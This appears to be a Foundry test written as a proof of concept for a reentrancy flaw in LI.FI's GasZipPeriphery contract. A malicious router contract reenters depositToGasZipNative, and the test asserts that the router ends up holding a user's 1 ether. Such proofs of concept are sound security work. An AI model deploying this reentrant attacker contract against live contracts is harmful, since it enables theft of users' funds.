// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { GasZipPeriphery } from "lifi/Periphery/GasZipPeriphery.sol";
import { IGasZip } from "lifi/Interfaces/IGasZip.sol";

contract ReentrantGasZipRouter {
    GasZipPeriphery public periphery;
    IGasZip.GasZipData public data;
    bool internal reentered;

    function setPeriphery(GasZipPeriphery _periphery) external {
        periphery = _periphery;
        data = IGasZip.GasZipData({
            receiverAddress: bytes32(uint256(uint160(address(0xBEEF)))),
            destinationChains: 0
        });
    }

    // Reentrantly call depositToGasZipNative to drain contract balance
    function deposit(uint256, bytes32) external payable {
        if (!reentered) {
            reentered = true;
            periphery.depositToGasZipNative(data, 0);
        }
    }

    // Accept ETH transfers from the periphery
    receive() external payable {}
}

contract GasZipPeripheryReentrancyTest is Test {
    GasZipPeriphery periphery;
    ReentrantGasZipRouter router;

    function setUp() public {
        router = new ReentrantGasZipRouter();
        periphery = new GasZipPeriphery(address(router), address(0), address(this));
        router.setPeriphery(periphery);
    }

    function test_DepositToGasZipNativeIsReentrant() public {
        IGasZip.GasZipData memory callData = IGasZip.GasZipData({
            receiverAddress: bytes32(uint256(1)),
            destinationChains: 0
        });

        // User sends 1 ether but intends to deposit 0 to router
        periphery.depositToGasZipNative{value: 1 ether}(callData, 0);

        // Router should have stolen the ether via reentrancy
        assertEq(address(router).balance, 1 ether, "router drained funds");
        assertEq(address(periphery).balance, 0, "periphery left with zero balance");
    }
}

